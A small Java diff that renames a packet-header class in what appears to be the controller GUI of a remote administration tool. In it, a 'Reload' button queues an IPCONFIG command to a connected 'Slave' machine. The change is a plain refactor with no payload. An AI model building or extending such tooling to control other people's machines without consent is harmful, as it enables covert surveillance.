@@ -14,7 +14,7 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.ScrollPaneConstants;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.packets.OutgoingHeader;
 
 @SuppressWarnings("serial")
 public class PanelControlNetGateway extends PanelControlParent {
@@ -36,7 +36,7 @@ public class PanelControlNetGateway extends PanelControlParent {
 		btnReload.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				textPane.setText("");
-				slave.addToSendQueue(Header.IPCONFIG);
+				slave.addToSendQueue(OutgoingHeader.IPCONFIG);
 			}
 		});
 		
